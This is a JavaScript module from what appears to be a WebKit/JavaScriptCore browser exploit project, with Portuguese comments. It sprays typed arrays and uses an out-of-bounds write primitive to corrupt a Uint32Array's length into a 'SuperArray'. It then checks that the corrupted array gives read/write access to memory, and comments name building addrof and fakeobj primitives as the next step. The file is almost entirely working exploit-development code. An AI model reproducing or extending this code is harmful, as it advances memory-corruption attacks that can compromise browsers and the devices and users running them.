// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_REPLICATE_USER_LOG = "replicateUserLogAndValidateSuperArray_v28c";

// Constantes do seu Log.txt [00:51:23] (investigateControl_v7)
const OOB_OFFSET_0x68_MVECTOR_TARGET = 0x68;
const OOB_OFFSET_0x6C_INTERACT_TARGET = 0x6C; // Offset que também é plantado e observado no seu log
const OOB_OFFSET_0x70_TRIGGER = 0x70;     // Onde o trigger principal é escrito e m_length é pego

// Valores INICIAIS a serem plantados no oob_buffer, conforme seu Log.txt
const VAL_TO_PLANT_AT_0x68_INITIALLY = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
const VAL_TO_PLANT_AT_0x6C_INITIALLY = new AdvancedInt64(0xFFFFFFFF, 0xEEEEFFFF); // eeeeffff_ffffffff

const TRIGGER_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Valores ESPERADOS no oob_buffer APÓS o trigger, conforme seu Log.txt
const EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd
const EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER = new AdvancedInt64(0x11223344, 0xFFFFFFFF); // 0xffffffff_11223344

// Metadados esperados para o SuperArray (objeto JS corrompido)
const EXPECTED_SUPERARRAY_M_VECTOR = EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER; // O valor que deve aparecer em 0x68
const EXPECTED_SUPERARRAY_M_LENGTH = 0xFFFFFFFF; // O LOW_DWORD do que aparece em 0x70

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;

const MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY = 0xFEEDF00D;
const MARKER_OFFSET_IN_OOB_DATA = 0x0; 

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() { // Nome da exportação mantido
    logS3(`--- Iniciando ${FNAME_REPLICATE_USER_LOG}: Replicar Log [00:51:23] v28c ---`, "test", FNAME_REPLICATE_USER_LOG);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            logS3("Falha ao inicializar ambiente OOB.", "critical", FNAME_REPLICATE_USER_LOG);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_USER_LOG);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_USER_LOG);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xD0D0D0D0 ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_USER_LOG);

        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real
        logS3(`FASE 2: Plantando valores iniciais em oob_buffer (PRÉ-TRIGGER)...`, "info", FNAME_REPLICATE_USER_LOG);
        oob_write_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, VAL_TO_PLANT_AT_0x68_INITIALLY, 8);
        oob_write_absolute(OOB_OFFSET_0x6C_INTERACT_TARGET, VAL_TO_PLANT_AT_0x6C_INITIALLY, 8);

        logS3("  Valores NO OOB_BUFFER ANTES do trigger (após nosso plantio):", "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68_MVECTOR_TARGET)}] = ${oob_read_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, 8).toString(true)}`, "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C_INTERACT_TARGET)}] = ${oob_read_absolute(OOB_OFFSET_0x6C_INTERACT_TARGET, 8).toString(true)}`, "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD inicial) = ${oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8).toString(true)}`, "info", FNAME_REPLICATE_USER_LOG);

        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] com ${TRIGGER_VALUE.toString(true)}...`, "info", FNAME_REPLICATE_USER_LOG);
        oob_write_absolute(OOB_OFFSET_0x70_TRIGGER, TRIGGER_VALUE, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_USER_LOG);
        
        const val_0x68_after = oob_read_absolute(OOB_OFFSET_0x68_MVECTOR_TARGET, 8); 
        const val_0x6C_after = oob_read_absolute(OOB_OFFSET_0x6C_INTERACT_TARGET, 8); 
        const val_0x70_qword_after = oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8);
        
        logS3(`  Valores NO OOB_BUFFER APÓS trigger (para comparação com Log [00:51:23]):`, "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68_MVECTOR_TARGET)}] = ${val_0x68_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER.toString(true)})`, "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C_INTERACT_TARGET)}] = ${val_0x6C_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER.toString(true)})`, "info", FNAME_REPLICATE_USER_LOG);
        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD) = ${val_0x70_qword_after.toString(true)} (LOW_DWORD esperado para m_length: ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})`, "info", FNAME_REPLICATE_USER_LOG);

        let oob_dynamics_match_log = val_0x68_after.equals(EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER) &&
                                     val_0x6C_after.equals(EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER) && // Checar também 0x6C
                                     val_0x70_qword_after.low() === EXPECTED_SUPERARRAY_M_LENGTH;

        if (oob_dynamics_match_log) {
            logS3("    !!!! Dinâmica de bytes no oob_buffer APÓS trigger CORRESPONDE ao seu Log de Sucesso [00:51:23] !!!!", "vuln", FNAME_REPLICATE_USER_LOG);
            document.title = "OOB DINÂMICA REPLICADA!";
        } else {
            logS3("    AVISO: Dinâmica de bytes no oob_buffer após trigger NÃO corresponde ao seu Log de Sucesso [00:51:23].", "warn", FNAME_REPLICATE_USER_LOG);
            document.title = "OOB Dinâmica DIFERENTE";
        }
        await PAUSE_S3(300);

        // FASE 4: Identificar SuperArray
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})...`, "info", FNAME_REPLICATE_USER_LOG);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_SUPERARRAY_M_LENGTH) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_USER_LOG);
                document.title = `SUPERARRAY Idx ${i}! Len OK!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  SuperArray obtido. O m_vector do objeto JS corrompido DEVERIA ser ${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)}.`, "info", FNAME_REPLICATE_USER_LOG);
            logS3(`  Validando se este m_vector permite ler/escrever no oob_array_buffer_real (assumindo que m_vector aponta para o dataPointer do oob_buffer)...`, "info", FNAME_REPLICATE_USER_LOG);

            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY, 4);
            logS3(`    Marcador ${toHex(MARKER_IN_OOB_TO_READ_VIA_SUPERARRAY)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] (via oob_write).`, "info", FNAME_REPLICATE_USER_LOG);
            
            const index_to_read_marker_in_superarray = MARKER_OFFSET_IN_OOB_DATA / 4;
            
            try {
                const test_write_val_superarray = 0xBADDBADD;
                logS3(`    Tentando SuperArray[${toHex(index_to_read_marker_in_superarray)}] = ${toHex(test_write_val_superarray)}.`, "info", FNAME_REPLICATE_USER_LOG);
                superArray[index_to_read_marker_in_superarray] = test_write_val_superarray;
                
                const val_in_oob_after_superarray_write = oob_read_absolute(MARKER_OFFSET_IN_OOB_DATA, 4);
                logS3(`    Valor em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] (após escrita do SuperArray, lido via oob_read): ${toHex(val_in_oob_after_superarray_write)}`, "info", FNAME_REPLICATE_USER_LOG);

                if (val_in_oob_after_superarray_write === test_write_val_superarray) {
                    logS3(`      !!!! SUCESSO !!!! SuperArray com m_vector=${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} PODE ESCREVER no oob_array_buffer_real!`, "vuln", FNAME_REPLICATE_USER_LOG);
                    document.title = "SUPERARRAY R/W FUNCIONAL!";
                    // AQUI TEMOS UMA PRIMITIVA PODEROSA: R/W sobre oob_array_buffer_real com tamanho gigante.
                    // Próximo passo: Usar para construir addrof e fakeobj.
                } else {
                    logS3(`      Falha na escrita do SuperArray no oob_buffer. Marcador não corresponde.`, "error", FNAME_REPLICATE_USER_LOG);
                    document.title = "SuperArray Escrita Falhou";
                }
            } catch (e) {
                 logS3(`    Erro ao tentar usar SuperArray para escrever/ler marcador: ${e.message}`, "error", FNAME_REPLICATE_USER_LOG);
                 document.title = "SuperArray Erro R/W Marcador";
            }
        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_REPLICATE_USER_LOG);
            document.title = "SuperArray NÃO Encontrado (v28c)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_USER_LOG}: ${e.message}`, "critical", FNAME_REPLICATE_USER_LOG);
        document.title = `${FNAME_REPLICATE_USER_LOG} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_REPLICATE_USER_LOG} Concluído ---`, "test", FNAME_REPLICATE_USER_LOG);
    }
}
